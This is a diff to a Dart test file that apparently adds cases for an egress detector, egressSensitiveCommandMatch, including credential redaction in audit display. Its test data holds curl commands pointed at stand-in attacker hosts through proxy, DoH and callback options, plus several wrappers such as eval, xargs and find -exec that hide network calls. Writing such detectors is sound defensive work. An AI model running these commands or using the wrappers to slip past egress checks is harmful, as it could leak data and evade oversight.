@@ -325,6 +325,88 @@ void main() {
       }
     });
 
+    test('classifies attached and detached network endpoint options', () {
+      for (final command in const <String>[
+        'curl --proxy=https://proxy.attacker.example http://localhost/health',
+        'curl --proxy https://proxy.attacker.example http://localhost/health',
+        'curl --doh-url=https://dns.attacker.example/dns-query http://localhost',
+        'curl --callback=https://callback.attacker.example http://localhost',
+      ]) {
+        expect(
+          egressSensitiveCommandMatch(command),
+          isNotNull,
+          reason: command,
+        );
+      }
+    });
+
+    test('holds subshell controls and unwraps exec commands', () {
+      expect(
+        egressSensitiveCommandMatch('(curl https://example.com/private)'),
+        isNotNull,
+      );
+      expect(
+        egressSensitiveCommandMatch('exec curl https://example.com/private'),
+        isNotNull,
+      );
+      expect(egressSensitiveCommandMatch(r"echo '(curl safe)'"), isNull);
+    });
+
+    test('holds unsupported shell grammar and secondary launchers', () {
+      for (final command in const <String>[
+        '{ curl https://example.com/private; }',
+        '! curl https://example.com/private',
+        'if curl https://example.com/private; then echo ok; fi',
+        'eval curl https://example.com/private',
+        'time curl https://example.com/private',
+        'xargs curl https://example.com/private',
+        'parallel curl ::: https://example.com/private',
+        'find . -exec curl https://example.com/private ;',
+      ]) {
+        expect(
+          egressSensitiveCommandMatch(command),
+          isNotNull,
+          reason: command,
+        );
+      }
+      expect(egressSensitiveCommandMatch(r"echo '{ ! safe; }'"), isNull);
+    });
+
+    test(
+      'holds unquoted environment expansions that require field splitting',
+      () {
+        const environment = <String, String>{
+          'CMD': 'curl https://example.com/private',
+        };
+
+        expect(
+          egressSensitiveCommandMatch(r'$CMD', environment: environment),
+          isNotNull,
+        );
+        expect(
+          egressSensitiveCommandMatch(r'"$CMD"', environment: environment),
+          isNull,
+        );
+      },
+    );
+
+    test('redacts credentials and URL secrets from audit command display', () {
+      const secret = 'arbitrary-secret-value';
+      final match = egressSensitiveCommandMatch(
+        'curl -u alice:$secret '
+        '--header="Authorization: Bearer $secret" '
+        '--cookie=session=$secret '
+        '--data=token=$secret '
+        'https://alice:pw@example.com/upload?token=$secret#fragment',
+      );
+
+      expect(match, isNotNull);
+      expect(match?.commandLine, isNot(contains(secret)));
+      expect(match?.commandLine, isNot(contains('alice:pw')));
+      expect(match?.commandLine, contains('<redacted>'));
+      expect(match?.commandLine, contains('https://example.com/<redacted>'));
+    });
+
     test('does not infer network egress from arbitrary argument words', () {
       expect(egressSensitiveCommandMatch('rg upload README.md'), isNull);
       expect(egressSensitiveCommandMatch('echo webhook'), isNull);
